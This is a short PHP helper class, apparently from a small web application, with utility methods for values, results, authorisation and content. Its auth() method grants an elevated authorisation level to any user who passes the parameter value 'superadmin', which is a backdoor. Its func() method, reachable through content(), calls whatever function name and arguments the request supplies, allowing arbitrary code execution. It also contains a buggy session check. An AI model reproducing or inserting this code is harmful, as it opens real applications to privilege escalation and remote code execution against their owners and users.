<?php

class utils{
static $private=1;
	
static function value($p){
return $p['value'];}

static function result($p){
return $p['inp1'].': '.$p['msg'];}

static function auth($p){
$uid=sql('id','login','v',['id'=>1]);
if(ses('uid'==1) or $p['param']=='superadmin')
	sql::up('login','auth','6','uid',ses('uid'));
return 'ok';}

static function func($p){$pb=explode('-',$p['o']);
return call_user_func_array($p['param'],$pb);}

static function resistance($p){		
return implode('',array_fill(0,1000,'123456789 '));}

static function content($p){
if($p['p1']??'')return self::func($p);
return hlpbt('ffw');}
	
}

?>